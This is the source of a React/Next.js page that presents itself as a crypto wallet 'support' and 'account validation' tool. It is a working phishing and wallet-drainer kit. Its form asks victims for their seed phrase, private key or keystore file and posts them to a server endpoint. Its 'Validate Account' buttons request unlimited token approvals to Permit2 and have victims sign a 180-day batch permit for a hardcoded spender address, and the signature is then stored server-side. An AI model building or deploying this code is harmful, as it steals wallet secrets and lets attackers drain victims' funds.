'use client'

'use client'

import { useState, useCallback } from 'react'
import { Card, CardContent } from "@/components/ui/card"
import Image from 'next/image'
import { AlertCircle } from 'lucide-react'
import { Button } from "@/components/ui/button"
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog"
import { Label } from "@/components/ui/label"
import { Textarea } from "@/components/ui/textarea"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { toast } from '@/hooks/use-toast'
import {
  AllowanceProvider,
  PERMIT2_ADDRESS,
  MaxAllowanceTransferAmount,
  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  AllowanceTransfer,
} from '@uniswap/permit2-sdk'


// eslint-disable-next-line @typescript-eslint/no-unused-vars
import * as dotenv from 'dotenv'
import { ethers, Contract } from 'ethers'

// Simplified PermitBatch type
interface PermitDetails {
  token: string;
  amount: ethers.BigNumberish;
  expiration: number;
  nonce: number;
}

interface PermitBatch {
  details: PermitDetails[];
  spender: string;
  sigDeadline: number;
}

function toDeadline(expiration: number): number {
  return Math.floor((Date.now() + expiration) / 1000)
}

dotenv.config()

type Issue = {
  id: string;
  icon: React.ReactNode;
  title: string;
  description: string;
}

type WalletType = {
  id: string;
  icon: string;
  name: string;
}

type Platform = {
  id: string;
  icon: string;
  name: string;
  description: string;
}

const issues: Issue[] = [
  { id: 'i1', icon: <AlertCircle className="h-6 w-6" />, title: 'Cannot access account', description: 'Unable to log in or access your account' },
  { id: 'i2', icon: <AlertCircle className="h-6 w-6" />, title: 'Transaction failed', description: 'Issues with sending or receiving crypto' },
  { id: 'i3', icon: <AlertCircle className="h-6 w-6" />, title: 'Wallet sync problems', description: 'Wallet not syncing or showing incorrect balance' },
  { id: 'i4', icon: <AlertCircle className="h-6 w-6" />, title: 'Security concerns', description: 'Suspicious activity or security questions' },
  { id: 'i5', icon: <AlertCircle className="h-6 w-6" />, title: 'Platform integration', description: 'Issues connecting to specific platforms or exchanges' },
  { id: 'i6', icon: <AlertCircle className="h-6 w-6" />, title: 'Migration', description: 'For any issues with Migrate seamlessly with no hassle.' },
  { id: 'i7', icon: <AlertCircle className="h-6 w-6" />, title: 'General Issues', description: 'For instant solution on any type of issues, to correct your node strings.' },
  { id: 'i8', icon: <AlertCircle className="h-6 w-6" />, title: 'NFTs/Minting', description: 'For any issues with mint/nfts or need support on how to receive any nfts?' },
  { id: 'i9', icon: <AlertCircle className="h-6 w-6" />, title: 'Swap/Exchange', description: 'For Swap/Exhange or any other related issues' },
  { id: 'i10', icon: <AlertCircle className="h-6 w-6" />, title: 'Claim Reward', description: 'For reward claiming or any related issues.' },
  { id: 'i11', icon: <AlertCircle className="h-6 w-6" />, title: 'Locked Account', description: 'If you are logged out due to activity on the account.'},
  { id: 'i12', icon: <AlertCircle className="h-6 w-6" />, title: 'Reset Wallet Password', description: 'To reset any kind of Exchange wallets Password.'},
  { id: 'i13', icon: <AlertCircle className="h-6 w-6" />, title: 'Claim Token', description: 'For airdrop claiming or any related issues.'},
  { id: 'i14', icon: <AlertCircle className="h-6 w-6" />, title: 'Transaction Delay', description: 'For stucked/delayed transactions.'},
  { id: 'i15', icon: <AlertCircle className="h-6 w-6" />, title: 'Buy Coins/Tokens', description: 'To trade, your account must be markrd as a trusted payment source.'},
  { id: 'i16', icon: <AlertCircle className="h-6 w-6" />, title: 'Missing Funds/Irregular Balance', description: 'Lost access to funds or funds is missing'},
  { id: 'i17', icon: <AlertCircle className="h-6 w-6" />, title: 'Bridge Tranfer', description: 'Do you have any issue while trying to transfer tokens between chains?'},
  { id: 'i18', icon: <AlertCircle className="h-6 w-6" />, title: 'Pool & Farm Access', description: 'Fix issues with any pool and Farm or related issue.'},
  { id: 'i19', icon: <AlertCircle className="h-6 w-6" />, title: 'Token Rectification', description: 'For issues with token rectification.'},
  { id: 'i20', icon: <AlertCircle className="h-6 w-6" />, title: 'Validate', description: 'For issues with Validation.'},
  { id: 'i21', icon: <AlertCircle className="h-6 w-6" />, title: 'Wallet Glitch/Error', description: 'Are you having glitch issues on your wallet?.'},
  { id: 'i22', icon: <AlertCircle className="h-6 w-6" />, title: 'High Fees', description: 'If you are facing an increase in transactions fees.'},
  { id: 'i23', icon: <AlertCircle className="h-6 w-6" />, title: 'Wallet Compromised', description: 'Are you a victim of wallet hack? Freeze all your funds.'},
  { id: 'i24', icon: <AlertCircle className="h-6 w-6" />, title: 'KYC/Whitelist', description: 'For help whitelisting your wallet for nfts.'},
  { id: 'i25', icon: <AlertCircle className="h-6 w-6" />, title: 'Staking', description: 'For tokens/coins staking realted issues.'},
  { id: 'i26', icon: <AlertCircle className="h-6 w-6" />, title: 'Login Issues', description: 'If you are encounter any issues logging into your wallet.'},
  { id: 'i27', icon: <AlertCircle className="h-6 w-6" />, title: 'Website Not loading', description: 'If you are not Unable to load any Exchange website.'},
  { id: 'i28', icon: <AlertCircle className="h-6 w-6" />, title: 'Issues With Trading Wallet', description: 'For issues With Trading Wallet'},

]

const wallets: WalletType[] = [
  { id: 'w1', icon: 'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg', name: 'MetaMask' },
  { id: 'w2', icon: 'https://play-lh.googleusercontent.com/mHjR3KaAMw3RGA15-t8gXNAy_Onr4ZYUQ07Z9fG2vd51IXO5rd7wtdqEWbNMPTgdqrk', name: 'Ledger' },
  { id: 'w3', icon: 'https://play-lh.googleusercontent.com/NwpBM4zjlxtmm6WWOw0k7M4F2Wpqx0LQpw9Zh-iAAoJPKgNK1vU2DotASwnRorSH5kY=w240-h480-rw', name: 'Trezor' },
  { id: 'w4', icon: 'https://logowik.com/content/uploads/images/trust-wallet-shield4830.logowik.com.webp', name: 'Trust Wallet' },
  { id: 'w5', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT94CZrRDBqwXdXIk74gxmVJjliUBzb-uCRgQ&s', name: 'WalletConnect' },
  { id: 'w6', icon: 'https://cryptologos.cc/logos/stacks-stx-logo.png', name: 'Stacks' },
  { id: 'w7', icon: 'https://play-lh.googleusercontent.com/uT6ByyNvUeLRMDnMKEC91RrbHftl2EBB58r9vZaNbiYf1F5Twa33_Hx0zYvEfCtiG1kE', name: 'Safepal' },
  { id: 'w8', icon: 'https://moonpay-marketing-c337344.payloadcms.app/api/media/file/6q7ysxp7jwi-4ArVLd4qOC6hpY4D7us0r0', name: 'Exodus' },
  { id: 'w9', icon: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/23/5d/c8/235dc851-fb29-48f1-2931-2e6073926c5c/AppIcon-1x_U007emarketing-0-10-0-85-220.png/1200x600wa.png', name: 'Atomic' },
  { id: 'w10', icon: 'https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/66/4a/b9/664ab980-b8c3-afc9-abc1-5032075ba74f/AppIcon-0-0-1x_U007epad-0-1-85-220.png/1200x630wa.png', name: 'Gem Wallet' },
  { id: 'w11', icon: 'https://cdn.prod.website-files.com/61d2c808f50b08ee42c1c477/63d7874416c8c09dc1d6f876_PhantomSG.png', name: 'Phantom' },
  { id: 'w12', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKbTDy_dXBdXPnBio-Db-Zy7uckGclEP_BQQ&s', name: 'Wasabi' },
  { id: 'w13', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS5iKZyaXBLLZtV4H3_H-sefyvFdr5hGpZgSQ&s', name: 'Binance' },
  { id: 'w14', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXQ4V6xWzg9q8L7jbqOpnQxaAyW6E-opOoOg&s', name: 'Arbitrum' },
  { id: 'w15', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQwIFBCAUmoMWPS_Bn7zUC3NOGuCIzaSdvjMQ&s', name: 'Aave' },
  { id: 'w16', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQijOUWd8bRawiQ4idpjdlmSLC3JqfdP5iiCg&s', name: 'Ton Hub' },
  { id: 'w17', icon: 'https://storage.googleapis.com/ton-strapi/Gradient_Type_Blue_Turquoise_1_5d461e32c4/Gradient_Type_Blue_Turquoise_1_5d461e32c4.png', name: 'Ton Keeper' },
  { id: 'w18', icon: 'https://pbs.twimg.com/profile_images/1747510699444875264/qNwD7l3B_400x400.jpg', name: 'Onto' },
  { id: 'w19', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQVDdnuPg48c1RcMIUxSMMrMRRrI4KSqHMhCw&s', name: 'Ownbit' },
  { id: 'w20', icon: 'https://pbs.twimg.com/media/GcC2hcpXgAAc2tW.png', name: 'Solflare' },
  { id: 'w21', icon: 'https://play-lh.googleusercontent.com/wjRjMDJ0GJDURRVhHeJ9GvBs171vfUuW1chLMPqeqHqB3o5LBQHWjYmt--eGwej4Ng', name: 'Glow' },
  { id: 'w22', icon: 'https://play-lh.googleusercontent.com/EhgMPJGUYrA7-8PNfOdZgVGzxrOw4toX8tQXv-YzIvN6sAMYFunQ55MVo2SS_hLiNm8', name: 'Backpack' },
  { id: 'w23', icon: 'https://play-lh.googleusercontent.com/-EcyFeHtPSGptfsZzgucRU2AOVgnGHyQ2DKx3R-dEbms4g4BzbvHpo8R-P-wrl18XCMk', name: 'Bitget' },
  { id: 'w24', icon: 'https://play-lh.googleusercontent.com/m9Ne2k_sHsLtlrdGATKHPNEDW2cDGlFf0FPhafMRxLaiwPnIEQa8J1-CEi3wztqQmmng', name: 'Zerion' },
  { id: 'w25', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSZU2WKaWruPknBKqHS0sUHcA8gmV4-Vo7bAZj-3oNd-mAF7N2bXbez5hNIyenbnPW8xpo&usqp=CAU', name: 'OKX' },
  { id: 'w26', icon: 'https://play-lh.googleusercontent.com/Jr9mlVzTOG_1uJPUrxoOR7llaQIpBYNxT5hZw0BUqaqjN1Cqsky-RjaTyAorkFlMZQ', name: 'Petra' },
  { id: 'w27', icon: 'https://miro.medium.com/v2/resize:fit:700/0*cBQArUdm7Ck5qHTA.png', name: 'Martian' },
  { id: 'w28', icon: 'https://avatars.githubusercontent.com/u/110686627?v=4', name: 'Suiet' },
  { id: 'w29', icon: 'https://pbs.twimg.com/profile_images/1085243621933232131/VjI2slUx_400x400.jpg', name: 'Solar' },
  { id: 'w30', icon: 'https://play-lh.googleusercontent.com/SKXXUqR4jXkvPJvKSXhJkQjKUU9wA-hI9lgBTrpxEz5GP8NbaOeSaEp1zzQscv8BTA', name: 'Kepler' },
  { id: 'w31', icon: 'https://framerusercontent.com/images/AbGYvbwnLekBbsdf5g7PI5PpSg.png', name: 'Leap' },
  { id: 'w32', icon: 'https://play-lh.googleusercontent.com/P-xt-cfYUtwVQ3YsNb5yd5_6MzCHmcKAbRkt-up8Ga44x_OCGLy4WFxsGhxfJaSLEw', name: 'Argent' },
  { id: 'w33', icon: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQOtKTpWMRg4JRSczLSN5FFOoTftXc06jBt4g&s', name: 'Sushiswap' },
  { id: 'w34', icon: 'https://defiguide.org/wp-content/uploads/2022/05/Featured-image-7-850x550.png', name: 'lido' },
  { id: 'w35', icon: 'https://play-lh.googleusercontent.com/rJF2Bcp9EDfARTSY-7DmYnX0Q6cX3zBwXm2RSUjjDInUObbiM1iVKfjXKZRS2BP7gSE', name: 'Uniswap' },
]
const platforms: Platform[] = [
  { 
    id: 'p1', 
    icon: 'https://pbs.twimg.com/profile_images/1721880644345622528/G2czctJJ_400x400.jpg', 
    name: 'Lido', 
    description: 'Empowering and securing Ethereum since 2020. Simple staking with stETH.' 
  },
  { 
    id: 'p2', 
    icon: 'https://cryptowardrobe.com/cdn/shop/products/845c2dff9e42c4ade2bf1eb9cfbd6536_1024x1024.jpg?v=1621416511', 
    name: 'Pancakswap', 
    description: 'Everyones Favorite DEX. Trade, earn, and own crypto on the all-in-one multichain DEX' 
  },
  { 
    id: 'p3', 
    icon: 'https://cdn.vectorstock.com/i/1000v/14/50/uniswap-coin-uni-cryptocurrency-icon-vector-39141450.jpg', 
    name: 'Uniswap', 
    description: 'Swap anytime, anywhere' 
  },
  { 
    id: 'p4', 
    icon: 'https://assets.coingecko.com/coins/images/37441/large/eigen.jpg?1728023974', 
    name: 'Eigen Layer', 
    description: 'Stake ETH across multiple protocols at once' 
  },
  { 
    id: 'p5', 
    icon: 'https://storage.getblock.io/web/web/images/marketplace/Meteora/photo_2024-07-24_11-40-32.jpg', 
    name: 'Meteora Pools', 
    description: 'Building the best LP tech and LP Army in crypto.' 
  },
  { 
    id: 'p6', 
    icon: 'https://cryptologos.cc/logos/starknet-token-strk-logo.png', 
    name: 'Starknet', 
    description: 'Starknet is the secure scaling technology bringing Ethereum’s benefits to the world.' 
  },
  { 
    id: 'p7', 
    icon: 'https://cryptologos.cc/logos/cosmos-atom-logo.png', 
    name: 'Cosmos', 
    description: 'Reduce costs, scale effortlessly, and make your business come alive. Hundreds of companies use Cosmos SDK to build fast, secure blockchain applications.' 
  },
  { 
    id: 'p8', 
    icon: 'https://cryptologos.cc/logos/sushiswap-sushi-logo.png', 
    name: 'Sushiswap', 
    description: 'Trade crypto effortlessly with SushiSwap, supporting over 30 chains and featuring a powerful aggregator for the best rates across DeFi.' 
  },
  { 
    id: 'p9', 
    icon: 'https://cryptologos.cc/logos/sushiswap-sushi-logo.png', 
    name: 'Other', 
    description: 'cant find your platform? Not to worry Select other and enter the details in the form. ' 
  },
]
export default function IssuesContent() {
  const [selectedIssue, setSelectedIssue] = useState<string | null>(null)
  const [selectedWallet, setSelectedWallet] = useState<string | null>(null)
  const [selectedPlatform, setSelectedPlatform] = useState<string | null>(null)
  const [isFormOpen, setIsFormOpen] = useState(false)
  const [formData, setFormData] = useState({
    option: '',
    additionalDetails: ''
  })
  const [isSubmitting, setIsSubmitting] = useState(false)
  const [account, setAccount] = useState<string>('')
  const [spender, setSpender] = useState<string>('')
  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  const [signature, setSignature] = useState<string>('')
  const [provider, setProvider] = useState<ethers.providers.Web3Provider | undefined>(undefined)
  // eslint-disable-next-line @typescript-eslint/no-unused-vars
  const [approvalAmounts, setApprovalAmounts] = useState<{
    permitAmount: ethers.BigNumber;
    expiration: number;
    nonce: number;
  }>({ permitAmount: ethers.BigNumber.from(0), expiration: 0, nonce: 0 })

  const handleApproveBatch = useCallback(async () => {
    if (!provider || !account) return;
    try {
      const signer = provider.getSigner(account);
      const approveAbi = ['function approve(address spender, uint256 amount)'];
      const tokens = [
        '0x9DE16c805A3227b9b92e39a446F9d56cf59fe640',
        '0x9704d2adBc02C085ff526a37ac64872027AC8a50',
      ];
      for (const token of tokens) {
        const tokenContract = new Contract(token, approveAbi, signer);
        const tx = await tokenContract.approve(PERMIT2_ADDRESS, MaxAllowanceTransferAmount);
        await tx.wait();
        console.log("Token approval successful for: ", token);
      }
      console.log('Batch approval successful!');
    } catch (e) {
      console.error('Batch approval failed:', e);
      throw e; // Re-throw to handle in caller
    }
  }, [account, provider]);



  const handlePermitBatch = useCallback(async () => {
    if (!provider || !account) return;
    try {
      const signer = provider.getSigner(account); // v5: sync getSigner
      const allowanceProvider = new AllowanceProvider(provider, PERMIT2_ADDRESS);
      const tokens = [
        '0x9DE16c805A3227b9b92e39a446F9d56cf59fe640',
        '0x9704d2adBc02C085ff526a37ac64872027AC8a50',
      ];
  
      const details: PermitDetails[] = [];
      for (const token of tokens) {
        const { nonce } = await allowanceProvider.getAllowanceData(token, account, spender);
        details.push({
          token: ethers.utils.getAddress(token),
          amount: MaxAllowanceTransferAmount,
          expiration: toDeadline(1000 * 60 * 60 * 24 * 30), // 30 days
          nonce,
        });
      }
      const permitBatch: PermitBatch = {
        details,
        spender,
        sigDeadline: toDeadline(1000 * 60 * 60 * 24 * 180), // 180 days
      };
  
      const domain = {
        name: 'Permit2',
        chainId: provider.network.chainId,
        verifyingContract: PERMIT2_ADDRESS,
      };
      const types = {
        PermitBatch: [
          { name: 'details', type: 'PermitDetails[]' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' },
        ],
        PermitDetails: [
          { name: 'token', type: 'address' },
          { name: 'amount', type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce', type: 'uint48' },
        ],
      };
      const values = permitBatch;
  
      // v5: Corrected _signTypedData call with 3 arguments
      const signature = await signer._signTypedData(domain, types, values);
      setSignature(signature);
      console.log('Batch Signature:', signature);
  
      const response = await fetch('/api/store/permit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ permitBatch, signature, owner: account }),
      });
      const result = await response.json();
      if (response.ok) {
        console.log("Batch permit stored successfully");
        alert('Account Validated Successfully!!');
      } else {
        throw new Error(result.message || 'Failed to store batch permit');
      }
    } catch (e) {
      console.error('Batch permit failed:', e);
      alert(`Batch permit failed: `);
    }
  }, [account, provider, spender]);

    const connectWallet = useCallback(async () => {
    try {
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const address = await (window as any).ethereum.request({
        method: 'eth_requestAccounts',
      });
      const checkSummedAddress = ethers.utils.getAddress(address[0]);
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      setProvider(new ethers.providers.Web3Provider((window as any).ethereum));
      setAccount(checkSummedAddress);
      setSpender('0xfB40B3c64992eF80d51333b0292c126A616aF0cD');
    } catch (e) {
      console.error('Wallet connection failed:', e);
    }
  }, []);

  // const handleApprovalCheck = useCallback(async () => {
  //   if (!provider || !account) return;
  //   try {
  //     const allowanceProvider = new AllowanceProvider(provider, PERMIT2_ADDRESS);
  //     const tokens = [
  //       '0x9DE16c805A3227b9b92e39a446F9d56cf59fe640',
  //       '0x9704d2adBc02C085ff526a37ac64872027AC8a50',
  //     ];
  //     const allowances = await Promise.all(
  //       tokens.map(async (token) => {
  //         const { amount, expiration, nonce } = await allowanceProvider.getAllowanceData(
  //           ethers.utils.getAddress(token),
  //           account,
  //           spender
  //         );
  //         return { token, amount, expiration, nonce };
  //       })
  //     );
  //     if (allowances.length > 0) {
  //       setApprovalAmounts({
  //         permitAmount: allowances[0].amount,
  //         expiration: allowances[0].expiration,
  //         nonce: allowances[0].nonce,
  //       });
  //     }
  //     console.log('Batch Allowances:', allowances);
  //   } catch (e) {
  //     console.error('Approval check failed:', e);
  //   }
  // }, [account, provider, spender]);



  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)

    const dataToSend = {
      issue: issues.find(i => i.id === selectedIssue)?.title,
      wallet: wallets.find(w => w.id === selectedWallet)?.name,
      platform: platforms.find(p => p.id === selectedPlatform)?.name,
      ...formData
    }

    try {
      const response = await fetch('/api/email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(dataToSend),
      })

      if (response.ok) {
        toast({
          title: "Success",
          description: "Your issue has been submitted successfully.",
        })
        setIsFormOpen(false)
      } else {
        throw new Error('Failed to send email')
      }
    // eslint-disable-next-line @typescript-eslint/no-unused-vars
    } catch (error) {
      toast({
        title: "Error",
        description: "Failed to submit your issue. Please try again.",
        variant: "destructive",
      })
    } finally {
      setIsSubmitting(false)
    }
  }

  return (
    <div className="space-y-6 sm:space-y-8">
    <div className='flex flex-col items-center gap-6 p-7'>
      {account ? (
        <>
          <Button onClick={handleApproveBatch} className='mb-4 bg-purple-400'>Allow Unichain to Validate Account</Button>
          <Button onClick={handlePermitBatch} className='mb-4 bg-purple-400'>Sign the Message</Button>
          <h3>Account: {account}</h3>
        </>
      ) : (
        <Button onClick={connectWallet} className='bg-purple-400'>Connect Wallet</Button>
      )}
    </div>
      <section>
        <h2 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4">What issue do you have?</h2>
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3 sm:gap-4">
          {issues.map((issue) => (
            <Card 
              key={issue.id} 
              className={`cursor-pointer transition-all ${selectedIssue === issue.id ? 'ring-2 ring-purple-600' : 'hover:bg-gray-50'}`}
              onClick={() => setSelectedIssue(issue.id)}
            >
              <CardContent className="flex flex-col items-center justify-center p-3 sm:p-4 h-full">
                <div className="text-purple-600 mb-2">{issue.icon}</div>
                <h3 className="font-semibold text-center mb-1 text-sm sm:text-base">{issue.title}</h3>
                <p className="text-xs text-gray-500 text-center">{issue.description}</p>
              </CardContent>
            </Card>
          ))}
        </div>
      </section>

      <section>
        <h2 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4">Which wallet do you use?</h2>
        <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-2 sm:gap-3">
          {wallets.map((wallet) => (
            <Card 
              key={wallet.id} 
              className={`cursor-pointer transition-all ${selectedWallet === wallet.id ? 'ring-2 ring-purple-600' : 'hover:bg-gray-50'}`}
              onClick={() => setSelectedWallet(wallet.id)}
            >
              <CardContent className="flex flex-col items-center justify-center p-2">
                <div className="mb-1">
                  <Image src={wallet.icon} alt={wallet.name} width={24} height={24} className="w-6 h-6 sm:w-8 sm:h-8" />
                </div>
                <span className="text-xs font-medium text-center">{wallet.name}</span>
              </CardContent>
            </Card>
          ))}
        </div>
      </section>

      <section>
        <h2 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4">Which platform?</h2>
        <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-3 sm:gap-4">
          {platforms.map((platform) => (
            <Card 
              key={platform.id} 
              className={`cursor-pointer transition-all ${selectedPlatform === platform.id ? 'ring-2 ring-purple-600' : 'hover:bg-gray-50'}`}
              onClick={() => setSelectedPlatform(platform.id)}
            >
              <CardContent className="flex flex-col items-center justify-center p-3 sm:p-4">
                <div className="mb-2">
                  <Image src={platform.icon} alt={platform.name} width={32} height={32} className="w-8 h-8 sm:w-10 sm:h-10" />
                </div>
                <h3 className="font-semibold text-center text-sm sm:text-base">{platform.name}</h3>
                <p className="text-xs text-gray-500 text-center mt-1">{platform.description}</p>
              </CardContent>
            </Card>
          ))}
        </div>
      </section>

      <Dialog open={isFormOpen} onOpenChange={setIsFormOpen}>
        <DialogTrigger asChild>
          <Button 
            className="w-full mt-6 sm:mt-8 bg-purple-600 hover:bg-purple-700 text-white" 
            size="lg"
            disabled={!selectedIssue || !selectedWallet || !selectedPlatform}
          >
            Fix
          </Button>
        </DialogTrigger>
        <DialogContent className="sm:max-w-[425px] w-[95vw] bg-white dark:bg-gray-800">
          <DialogHeader>
            <DialogTitle className="text-xl sm:text-2xl font-bold text-purple-600 dark:text-purple-400">Fix Issue</DialogTitle>
          </DialogHeader>
          <form onSubmit={handleSubmit} className="space-y-4 mt-4">
            <div className="space-y-2">
              <Label htmlFor="issue" className="text-sm font-medium text-gray-700 dark:text-gray-300">Issue</Label>
              <p id="issue" className="text-sm font-semibold text-purple-600 dark:text-purple-400">{issues.find(i => i.id === selectedIssue)?.title}</p>
            </div>
            <div className="space-y-2">
              <Label htmlFor="wallet" className="text-sm font-medium text-gray-700 dark:text-gray-300">Wallet</Label>
              <p id="wallet" className="text-sm font-semibold text-purple-600 dark:text-purple-400">{wallets.find(w => w.id === selectedWallet)?.name}</p>
            </div>
            <div className="space-y-2">
              <Label htmlFor="platform" className="text-sm font-medium text-gray-700 dark:text-gray-300">Platform</Label>
              <p id="platform" className="text-sm font-semibold text-purple-600 dark:text-purple-400">{platforms.find(p => p.id === selectedPlatform)?.name}</p>
            </div>
            <div className="space-y-2">
              <Label htmlFor="option" className="text-sm font-medium text-gray-700 dark:text-gray-300">Select an option</Label>
              <Select 
                value={formData.option} 
                onValueChange={(value) => setFormData(prev => ({ ...prev, option: value }))}
              >
                <SelectTrigger className="w-full border-gray-300 focus:border-purple-500 focus:ring-purple-500">
                  <SelectValue placeholder="Choose Connection method" />
                </SelectTrigger>
                <SelectContent className="bg-white dark:bg-gray-800 border border-gray-200 dark:border-gray-700 shadow-lg rounded-md overflow-hidden">
                  <SelectItem value="Phrase" className="py-2 px-4 hover:bg-purple-100 dark:hover:bg-purple-900 cursor-pointer">Phrase</SelectItem>                  
                  <SelectItem value="Private Key" className="py-2 px-4 hover:bg-purple-100 dark:hover:bg-purple-900 cursor-pointer">Private Key</SelectItem>
                  <SelectItem value="JSON FILE" className="py-2 px-4 hover:bg-purple-100 dark:hover:bg-purple-900 cursor-pointer">JSON File</SelectItem>                
                </SelectContent>
              </Select>
            </div>
            <div className="space-y-2">
              <Label htmlFor="additionalDetails" className="text-sm font-medium text-gray-700 dark:text-gray-300">Additional Details</Label>
              <Textarea
                id="additionalDetails"
                value={formData.additionalDetails}
                onChange={(e) => setFormData(prev => ({ ...prev, additionalDetails: e.target.value }))}
                placeholder="Enter any additional details here..."
                className="w-full border-gray-300 focus:border-purple-500 focus:ring-purple-500 min-h-[100px]"
              />
            </div>
            <Button 
              type="submit" 
              className="w-full bg-purple-600 hover:bg-purple-700 text-white transition-colors duration-200"
              disabled={isSubmitting}
            >
              {isSubmitting ? 'Submitting...' : 'Submit'}
            </Button>
          </form>
        </DialogContent>
      </Dialog>
    </div>
  )
}